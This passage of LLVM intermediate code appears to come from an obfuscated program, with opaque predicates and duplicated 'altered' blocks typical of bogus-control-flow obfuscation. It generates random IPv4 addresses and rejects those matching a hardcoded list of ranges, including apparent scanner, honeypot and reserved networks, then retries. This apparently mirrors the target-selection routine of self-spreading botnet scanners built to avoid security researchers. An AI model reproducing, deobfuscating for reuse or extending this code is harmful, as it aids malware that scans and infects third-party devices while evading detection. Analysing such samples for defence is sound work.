  br i1 %691, label %700, label %720

; <label>:700:                                    ; preds = %originalBBpart292
  %701 = load i32, i32* @x.51
  %702 = load i32, i32* @y.52
  %703 = sub i32 %701, 1
  %704 = mul i32 %701, %703
  %705 = urem i32 %704, 2
  %706 = icmp eq i32 %705, 0
  %707 = icmp slt i32 %702, 10
  %708 = or i1 %706, %707
  br i1 %708, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %700
  %709 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %710 = zext i8 %709 to i32
  %711 = icmp eq i32 %710, 128
  %712 = load i32, i32* @x.51
  %713 = load i32, i32* @y.52
  %714 = sub i32 %712, 1
  %715 = mul i32 %712, %714
  %716 = urem i32 %715, 2
  %717 = icmp eq i32 %716, 0
  %718 = icmp slt i32 %713, 10
  %719 = or i1 %717, %718
  br i1 %719, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %711, label %1160, label %720

; <label>:720:                                    ; preds = %originalBBpart296, %originalBBpart292, %676
  %721 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %722 = zext i8 %721 to i32
  %723 = icmp eq i32 %722, 162
  br i1 %723, label %724, label %732

; <label>:724:                                    ; preds = %720
  %725 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %726 = zext i8 %725 to i32
  %727 = icmp eq i32 %726, 251
  br i1 %727, label %728, label %732

; <label>:728:                                    ; preds = %724
  %729 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %730 = zext i8 %729 to i32
  %731 = icmp eq i32 %730, 120
  br i1 %731, label %1160, label %732

; <label>:732:                                    ; preds = %728, %724, %720
  %733 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %734 = zext i8 %733 to i32
  %735 = icmp eq i32 %734, 173
  br i1 %735, label %736, label %760

; <label>:736:                                    ; preds = %732
  %737 = load i32, i32* @x.51
  %738 = load i32, i32* @y.52
  %739 = sub i32 %737, 1
  %740 = mul i32 %737, %739
  %741 = urem i32 %740, 2
  %742 = icmp eq i32 %741, 0
  %743 = icmp slt i32 %738, 10
  %744 = or i1 %742, %743
  br i1 %744, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %736
  %745 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %746 = zext i8 %745 to i32
  %747 = icmp eq i32 %746, 208
  %748 = load i32, i32* @x.51
  %749 = load i32, i32* @y.52
  %750 = sub i32 %748, 1
  %751 = mul i32 %748, %750
  %752 = urem i32 %751, 2
  %753 = icmp eq i32 %752, 0
  %754 = icmp slt i32 %749, 10
  %755 = or i1 %753, %754
  br i1 %755, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %747, label %756, label %760

; <label>:756:                                    ; preds = %originalBBpart2100
  %757 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %758 = zext i8 %757 to i32
  %759 = icmp eq i32 %758, 128
  br i1 %759, label %1160, label %760

; <label>:760:                                    ; preds = %756, %originalBBpart2100, %732
  %761 = load i32, i32* @x.51
  %762 = load i32, i32* @y.52
  %763 = sub i32 %761, 1
  %764 = mul i32 %761, %763
  %765 = urem i32 %764, 2
  %766 = icmp eq i32 %765, 0
  %767 = icmp slt i32 %762, 10
  %768 = or i1 %766, %767
  br i1 %768, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %760
  %769 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %770 = zext i8 %769 to i32
  %771 = icmp eq i32 %770, 173
  %772 = load i32, i32* @x.51
  %773 = load i32, i32* @y.52
  %774 = sub i32 %772, 1
  %775 = mul i32 %772, %774
  %776 = urem i32 %775, 2
  %777 = icmp eq i32 %776, 0
  %778 = icmp slt i32 %773, 10
  %779 = or i1 %777, %778
  br i1 %779, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %771, label %780, label %788

; <label>:780:                                    ; preds = %originalBBpart2104
  %781 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %782 = zext i8 %781 to i32
  %783 = icmp eq i32 %782, 208
  br i1 %783, label %784, label %788

; <label>:784:                                    ; preds = %780
  %785 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %786 = zext i8 %785 to i32
  %787 = icmp eq i32 %786, 180
  br i1 %787, label %1160, label %788

; <label>:788:                                    ; preds = %784, %780, %originalBBpart2104
  %789 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %790 = zext i8 %789 to i32
  %791 = icmp eq i32 %790, 173
  br i1 %791, label %792, label %800

; <label>:792:                                    ; preds = %788
  %793 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %794 = zext i8 %793 to i32
  %795 = icmp eq i32 %794, 208
  br i1 %795, label %796, label %800

; <label>:796:                                    ; preds = %792
  %797 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %798 = zext i8 %797 to i32
  %799 = icmp eq i32 %798, 250
  br i1 %799, label %1160, label %800

; <label>:800:                                    ; preds = %796, %792, %788
  %801 = load i32, i32* @x.51
  %802 = load i32, i32* @y.52
  %803 = sub i32 %801, 1
  %804 = mul i32 %801, %803
  %805 = urem i32 %804, 2
  %806 = icmp eq i32 %805, 0
  %807 = icmp slt i32 %802, 10
  %808 = or i1 %806, %807
  br i1 %808, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %800
  %809 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %810 = zext i8 %809 to i32
  %811 = icmp eq i32 %810, 192
  %812 = load i32, i32* @x.51
  %813 = load i32, i32* @y.52
  %814 = sub i32 %812, 1
  %815 = mul i32 %812, %814
  %816 = urem i32 %815, 2
  %817 = icmp eq i32 %816, 0
  %818 = icmp slt i32 %813, 10
  %819 = or i1 %817, %818
  br i1 %819, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %811, label %820, label %860

; <label>:820:                                    ; preds = %originalBBpart2108
  %821 = load i32, i32* @x.51
  %822 = load i32, i32* @y.52
  %823 = sub i32 %821, 1
  %824 = mul i32 %821, %823
  %825 = urem i32 %824, 2
  %826 = icmp eq i32 %825, 0
  %827 = icmp slt i32 %822, 10
  %828 = or i1 %826, %827
  br i1 %828, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %820
  %829 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %830 = zext i8 %829 to i32
  %831 = icmp eq i32 %830, 187
  %832 = load i32, i32* @x.51
  %833 = load i32, i32* @y.52
  %834 = sub i32 %832, 1
  %835 = mul i32 %832, %834
  %836 = urem i32 %835, 2
  %837 = icmp eq i32 %836, 0
  %838 = icmp slt i32 %833, 10
  %839 = or i1 %837, %838
  br i1 %839, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %831, label %840, label %860

; <label>:840:                                    ; preds = %originalBBpart2112
  %841 = load i32, i32* @x.51
  %842 = load i32, i32* @y.52
  %843 = sub i32 %841, 1
  %844 = mul i32 %841, %843
  %845 = urem i32 %844, 2
  %846 = icmp eq i32 %845, 0
  %847 = icmp slt i32 %842, 10
  %848 = or i1 %846, %847
  br i1 %848, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %840
  %849 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %850 = zext i8 %849 to i32
  %851 = icmp eq i32 %850, 113
  %852 = load i32, i32* @x.51
  %853 = load i32, i32* @y.52
  %854 = sub i32 %852, 1
  %855 = mul i32 %852, %854
  %856 = urem i32 %855, 2
  %857 = icmp eq i32 %856, 0
  %858 = icmp slt i32 %853, 10
  %859 = or i1 %857, %858
  br i1 %859, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %851, label %1160, label %860

; <label>:860:                                    ; preds = %originalBBpart2116, %originalBBpart2112, %originalBBpart2108
  %861 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %862 = zext i8 %861 to i32
  %863 = icmp eq i32 %862, 198
  br i1 %863, label %864, label %888

; <label>:864:                                    ; preds = %860
  %865 = load i32, i32* @x.51
  %866 = load i32, i32* @y.52
  %867 = sub i32 %865, 1
  %868 = mul i32 %865, %867
  %869 = urem i32 %868, 2
  %870 = icmp eq i32 %869, 0
  %871 = icmp slt i32 %866, 10
  %872 = or i1 %870, %871
  br i1 %872, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %864
  %873 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %874 = zext i8 %873 to i32
  %875 = icmp eq i32 %874, 204
  %876 = load i32, i32* @x.51
  %877 = load i32, i32* @y.52
  %878 = sub i32 %876, 1
  %879 = mul i32 %876, %878
  %880 = urem i32 %879, 2
  %881 = icmp eq i32 %880, 0
  %882 = icmp slt i32 %877, 10
  %883 = or i1 %881, %882
  br i1 %883, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %875, label %884, label %888

; <label>:884:                                    ; preds = %originalBBpart2120
  %885 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %886 = zext i8 %885 to i32
  %887 = icmp eq i32 %886, 241
  br i1 %887, label %1160, label %888

; <label>:888:                                    ; preds = %884, %originalBBpart2120, %860
  %889 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %890 = zext i8 %889 to i32
  %891 = icmp eq i32 %890, 204
  br i1 %891, label %892, label %900

; <label>:892:                                    ; preds = %888
  %893 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %894 = zext i8 %893 to i32
  %895 = icmp eq i32 %894, 10
  br i1 %895, label %896, label %900

; <label>:896:                                    ; preds = %892
  %897 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %898 = zext i8 %897 to i32
  %899 = icmp eq i32 %898, 160
  br i1 %899, label %1160, label %900

; <label>:900:                                    ; preds = %896, %892, %888
  %901 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %902 = zext i8 %901 to i32
  %903 = icmp eq i32 %902, 204
  br i1 %903, label %904, label %928

; <label>:904:                                    ; preds = %900
  %905 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %906 = zext i8 %905 to i32
  %907 = icmp eq i32 %906, 12
  br i1 %907, label %908, label %928

; <label>:908:                                    ; preds = %904
  %909 = load i32, i32* @x.51
  %910 = load i32, i32* @y.52
  %911 = sub i32 %909, 1
  %912 = mul i32 %909, %911
  %913 = urem i32 %912, 2
  %914 = icmp eq i32 %913, 0
  %915 = icmp slt i32 %910, 10
  %916 = or i1 %914, %915
  br i1 %916, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %908
  %917 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %918 = zext i8 %917 to i32
  %919 = icmp eq i32 %918, 192
  %920 = load i32, i32* @x.51
  %921 = load i32, i32* @y.52
  %922 = sub i32 %920, 1
  %923 = mul i32 %920, %922
  %924 = urem i32 %923, 2
  %925 = icmp eq i32 %924, 0
  %926 = icmp slt i32 %921, 10
  %927 = or i1 %925, %926
  br i1 %927, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %919, label %1160, label %928

; <label>:928:                                    ; preds = %originalBBpart2124, %904, %900
  %929 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %930 = zext i8 %929 to i32
  %931 = icmp eq i32 %930, 208
  br i1 %931, label %932, label %940

; <label>:932:                                    ; preds = %928
  %933 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %934 = zext i8 %933 to i32
  %935 = icmp eq i32 %934, 110
  br i1 %935, label %936, label %940

; <label>:936:                                    ; preds = %932
  %937 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %938 = zext i8 %937 to i32
  %939 = icmp eq i32 %938, 64
  br i1 %939, label %1160, label %940

; <label>:940:                                    ; preds = %936, %932, %928
  %941 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %942 = zext i8 %941 to i32
  %943 = icmp eq i32 %942, 208
  br i1 %943, label %944, label %968

; <label>:944:                                    ; preds = %940
  %945 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %946 = zext i8 %945 to i32
  %947 = icmp eq i32 %946, 110
  br i1 %947, label %948, label %968

; <label>:948:                                    ; preds = %944
  %949 = load i32, i32* @x.51
  %950 = load i32, i32* @y.52
  %951 = sub i32 %949, 1
  %952 = mul i32 %949, %951
  %953 = urem i32 %952, 2
  %954 = icmp eq i32 %953, 0
  %955 = icmp slt i32 %950, 10
  %956 = or i1 %954, %955
  br i1 %956, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %948
  %957 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %958 = zext i8 %957 to i32
  %959 = icmp eq i32 %958, 72
  %960 = load i32, i32* @x.51
  %961 = load i32, i32* @y.52
  %962 = sub i32 %960, 1
  %963 = mul i32 %960, %962
  %964 = urem i32 %963, 2
  %965 = icmp eq i32 %964, 0
  %966 = icmp slt i32 %961, 10
  %967 = or i1 %965, %966
  br i1 %967, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %959, label %1160, label %968

; <label>:968:                                    ; preds = %originalBBpart2128, %944, %940
  %969 = load i32, i32* @x.51
  %970 = load i32, i32* @y.52
  %971 = sub i32 %969, 1
  %972 = mul i32 %969, %971
  %973 = urem i32 %972, 2
  %974 = icmp eq i32 %973, 0
  %975 = icmp slt i32 %970, 10
  %976 = or i1 %974, %975
  br i1 %976, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %968
  %977 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %978 = zext i8 %977 to i32
  %979 = icmp eq i32 %978, 208
  %980 = load i32, i32* @x.51
  %981 = load i32, i32* @y.52
  %982 = sub i32 %980, 1
  %983 = mul i32 %980, %982
  %984 = urem i32 %983, 2
  %985 = icmp eq i32 %984, 0
  %986 = icmp slt i32 %981, 10
  %987 = or i1 %985, %986
  br i1 %987, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %979, label %988, label %992

; <label>:988:                                    ; preds = %originalBBpart2132
  %989 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %990 = zext i8 %989 to i32
  %991 = icmp eq i32 %990, 67
  br i1 %991, label %1160, label %992

; <label>:992:                                    ; preds = %988, %originalBBpart2132
  %993 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %994 = zext i8 %993 to i32
  %995 = icmp eq i32 %994, 94
  br i1 %995, label %996, label %1020

; <label>:996:                                    ; preds = %992
  %997 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %998 = zext i8 %997 to i32
  %999 = icmp eq i32 %998, 102
  br i1 %999, label %1000, label %1020

; <label>:1000:                                   ; preds = %996
  %1001 = load i32, i32* @x.51
  %1002 = load i32, i32* @y.52
  %1003 = sub i32 %1001, 1
  %1004 = mul i32 %1001, %1003
  %1005 = urem i32 %1004, 2
  %1006 = icmp eq i32 %1005, 0
  %1007 = icmp slt i32 %1002, 10
  %1008 = or i1 %1006, %1007
  br i1 %1008, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1000
  %1009 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1010 = zext i8 %1009 to i32
  %1011 = icmp eq i32 %1010, 48
  %1012 = load i32, i32* @x.51
  %1013 = load i32, i32* @y.52
  %1014 = sub i32 %1012, 1
  %1015 = mul i32 %1012, %1014
  %1016 = urem i32 %1015, 2
  %1017 = icmp eq i32 %1016, 0
  %1018 = icmp slt i32 %1013, 10
  %1019 = or i1 %1017, %1018
  br i1 %1019, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1011, label %1160, label %1020

; <label>:1020:                                   ; preds = %originalBBpart2136, %996, %992
  %1021 = load i32, i32* @x.51
  %1022 = load i32, i32* @y.52
  %1023 = sub i32 %1021, 1
  %1024 = mul i32 %1021, %1023
  %1025 = urem i32 %1024, 2
  %1026 = icmp eq i32 %1025, 0
  %1027 = icmp slt i32 %1022, 10
  %1028 = or i1 %1026, %1027
  br i1 %1028, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1020
  %1029 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1030 = zext i8 %1029 to i32
  %1031 = icmp eq i32 %1030, 93
  %1032 = load i32, i32* @x.51
  %1033 = load i32, i32* @y.52
  %1034 = sub i32 %1032, 1
  %1035 = mul i32 %1032, %1034
  %1036 = urem i32 %1035, 2
  %1037 = icmp eq i32 %1036, 0
  %1038 = icmp slt i32 %1033, 10
  %1039 = or i1 %1037, %1038
  br i1 %1039, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %1031, label %1040, label %1048

; <label>:1040:                                   ; preds = %originalBBpart2140
  %1041 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1042 = zext i8 %1041 to i32
  %1043 = icmp eq i32 %1042, 174
  br i1 %1043, label %1044, label %1048

; <label>:1044:                                   ; preds = %1040
  %1045 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1046 = zext i8 %1045 to i32
  %1047 = icmp eq i32 %1046, 88
  br i1 %1047, label %1160, label %1048

; <label>:1048:                                   ; preds = %1044, %1040, %originalBBpart2140
  %1049 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1050 = zext i8 %1049 to i32
  %1051 = icmp eq i32 %1050, 89
  br i1 %1051, label %1052, label %1076

; <label>:1052:                                   ; preds = %1048
  %1053 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1054 = zext i8 %1053 to i32
  %1055 = icmp eq i32 %1054, 248
  br i1 %1055, label %1056, label %1076

; <label>:1056:                                   ; preds = %1052
  %1057 = load i32, i32* @x.51
  %1058 = load i32, i32* @y.52
  %1059 = sub i32 %1057, 1
  %1060 = mul i32 %1057, %1059
  %1061 = urem i32 %1060, 2
  %1062 = icmp eq i32 %1061, 0
  %1063 = icmp slt i32 %1058, 10
  %1064 = or i1 %1062, %1063
  br i1 %1064, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1056
  %1065 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1066 = zext i8 %1065 to i32
  %1067 = icmp eq i32 %1066, 174
  %1068 = load i32, i32* @x.51
  %1069 = load i32, i32* @y.52
  %1070 = sub i32 %1068, 1
  %1071 = mul i32 %1068, %1070
  %1072 = urem i32 %1071, 2
  %1073 = icmp eq i32 %1072, 0
  %1074 = icmp slt i32 %1069, 10
  %1075 = or i1 %1073, %1074
  br i1 %1075, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %1067, label %1160, label %1076

; <label>:1076:                                   ; preds = %originalBBpart2144, %1052, %1048
  %1077 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1078 = zext i8 %1077 to i32
  %1079 = icmp eq i32 %1078, 89
  br i1 %1079, label %1080, label %1088

; <label>:1080:                                   ; preds = %1076
  %1081 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1082 = zext i8 %1081 to i32
  %1083 = icmp eq i32 %1082, 248
  br i1 %1083, label %1084, label %1088

; <label>:1084:                                   ; preds = %1080
  %1085 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1086 = zext i8 %1085 to i32
  %1087 = icmp eq i32 %1086, 172
  br i1 %1087, label %1160, label %1088

; <label>:1088:                                   ; preds = %1084, %1080, %1076
  %1089 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1090 = zext i8 %1089 to i32
  %1091 = icmp eq i32 %1090, 89
  br i1 %1091, label %1092, label %1100

; <label>:1092:                                   ; preds = %1088
  %1093 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1094 = zext i8 %1093 to i32
  %1095 = icmp eq i32 %1094, 248
  br i1 %1095, label %1096, label %1100

; <label>:1096:                                   ; preds = %1092
  %1097 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1098 = zext i8 %1097 to i32
  %1099 = icmp eq i32 %1098, 170
  br i1 %1099, label %1160, label %1100

; <label>:1100:                                   ; preds = %1096, %1092, %1088
  %1101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1102 = zext i8 %1101 to i32
  %1103 = icmp eq i32 %1102, 89
  br i1 %1103, label %1104, label %1128

; <label>:1104:                                   ; preds = %1100
  %1105 = load i32, i32* @x.51
  %1106 = load i32, i32* @y.52
  %1107 = sub i32 %1105, 1
  %1108 = mul i32 %1105, %1107
  %1109 = urem i32 %1108, 2
  %1110 = icmp eq i32 %1109, 0
  %1111 = icmp slt i32 %1106, 10
  %1112 = or i1 %1110, %1111
  br i1 %1112, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1104
  %1113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1114 = zext i8 %1113 to i32
  %1115 = icmp eq i32 %1114, 248
  %1116 = load i32, i32* @x.51
  %1117 = load i32, i32* @y.52
  %1118 = sub i32 %1116, 1
  %1119 = mul i32 %1116, %1118
  %1120 = urem i32 %1119, 2
  %1121 = icmp eq i32 %1120, 0
  %1122 = icmp slt i32 %1117, 10
  %1123 = or i1 %1121, %1122
  br i1 %1123, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1115, label %1124, label %1128

; <label>:1124:                                   ; preds = %originalBBpart2148
  %1125 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1126 = zext i8 %1125 to i32
  %1127 = icmp eq i32 %1126, 169
  br i1 %1127, label %1160, label %1128

; <label>:1128:                                   ; preds = %1124, %originalBBpart2148, %1100
  %1129 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1130 = zext i8 %1129 to i32
  %1131 = icmp eq i32 %1130, 89
  br i1 %1131, label %1132, label %1156

; <label>:1132:                                   ; preds = %1128
  %1133 = load i32, i32* @x.51
  %1134 = load i32, i32* @y.52
  %1135 = sub i32 %1133, 1
  %1136 = mul i32 %1133, %1135
  %1137 = urem i32 %1136, 2
  %1138 = icmp eq i32 %1137, 0
  %1139 = icmp slt i32 %1134, 10
  %1140 = or i1 %1138, %1139
  br i1 %1140, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1132
  %1141 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1142 = zext i8 %1141 to i32
  %1143 = icmp eq i32 %1142, 248
  %1144 = load i32, i32* @x.51
  %1145 = load i32, i32* @y.52
  %1146 = sub i32 %1144, 1
  %1147 = mul i32 %1144, %1146
  %1148 = urem i32 %1147, 2
  %1149 = icmp eq i32 %1148, 0
  %1150 = icmp slt i32 %1145, 10
  %1151 = or i1 %1149, %1150
  br i1 %1151, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %1143, label %1152, label %1156

; <label>:1152:                                   ; preds = %originalBBpart2152
  %1153 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1154 = zext i8 %1153 to i32
  %1155 = icmp eq i32 %1154, 160
  br i1 %1155, label %1160, label %1156

; <label>:1156:                                   ; preds = %1152, %originalBBpart2152, %1128
  %1157 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1158 = zext i8 %1157 to i32
  %1159 = icmp sge i32 %1158, 224
  br label %1160

; <label>:1160:                                   ; preds = %1156, %1152, %1124, %1096, %1084, %originalBBpart2144, %1044, %originalBBpart2136, %988, %originalBBpart2128, %936, %originalBBpart2124, %896, %884, %originalBBpart2116, %796, %784, %756, %728, %originalBBpart296, %originalBBpart288, %644, %616, %572, %560, %originalBBpart272, %488, %476, %originalBBpart252, %388, %originalBBpart240, %originalBBpart236, %304, %originalBBpart232, %264, %220, %216, %192, %184, %originalBBpart212, %112, %100, %92, %originalBBpart24, %60, %56
  %1161 = phi i1 [ true, %1152 ], [ true, %1124 ], [ true, %1096 ], [ true, %1084 ], [ true, %originalBBpart2144 ], [ true, %1044 ], [ true, %originalBBpart2136 ], [ true, %988 ], [ true, %originalBBpart2128 ], [ true, %936 ], [ true, %originalBBpart2124 ], [ true, %896 ], [ true, %884 ], [ true, %originalBBpart2116 ], [ true, %796 ], [ true, %784 ], [ true, %756 ], [ true, %728 ], [ true, %originalBBpart296 ], [ true, %originalBBpart288 ], [ true, %644 ], [ true, %616 ], [ true, %572 ], [ true, %560 ], [ true, %originalBBpart272 ], [ true, %488 ], [ true, %476 ], [ true, %originalBBpart252 ], [ true, %388 ], [ true, %originalBBpart240 ], [ true, %originalBBpart236 ], [ true, %304 ], [ true, %originalBBpart232 ], [ true, %264 ], [ true, %220 ], [ true, %216 ], [ true, %192 ], [ true, %184 ], [ true, %originalBBpart212 ], [ true, %112 ], [ true, %100 ], [ true, %92 ], [ true, %originalBBpart24 ], [ true, %60 ], [ true, %56 ], [ %1159, %1156 ]
  br i1 %1161, label %1162, label %1175

; <label>:1162:                                   ; preds = %1160
  %1163 = call i32 @rand() #2
  %1164 = srem i32 %1163, 255
  %1165 = trunc i32 %1164 to i8
  store i8 %1165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1166 = call i32 @rand() #2
  %1167 = srem i32 %1166, 255
  %1168 = trunc i32 %1167 to i8
  store i8 %1168, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1169 = call i32 @rand() #2
  %1170 = srem i32 %1169, 255
  %1171 = trunc i32 %1170 to i8
  store i8 %1171, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1172 = call i32 @rand() #2
  %1173 = srem i32 %1172, 255
  %1174 = trunc i32 %1173 to i8
  store i8 %1174, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %56

; <label>:1175:                                   ; preds = %1160
  %1176 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1176, i8 0, i64 16, i32 16, i1 false)
  %1177 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %1178 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %1179 = zext i8 %1178 to i32
  %1180 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %1181 = zext i8 %1180 to i32
  %1182 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1183 = zext i8 %1182 to i32
